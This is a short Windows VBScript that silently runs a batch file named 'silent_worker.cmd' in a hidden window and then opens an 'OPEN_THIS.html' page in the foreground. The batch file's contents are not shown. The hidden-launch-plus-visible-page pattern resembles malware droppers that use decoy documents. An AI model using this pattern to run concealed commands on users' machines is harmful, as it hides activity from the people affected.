Option Explicit
Dim shell, fso, folder, worker, helper
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
folder = fso.GetParentFolderName(WScript.ScriptFullName)
worker = fso.BuildPath(folder, "silent_worker.cmd")
helper = fso.BuildPath(folder, "OPEN_THIS.html")
shell.Run Chr(34) & worker & Chr(34), 0, False
If fso.FileExists(helper) Then
  WScript.Sleep 700
  shell.Run Chr(34) & helper & Chr(34), 1, False
End If
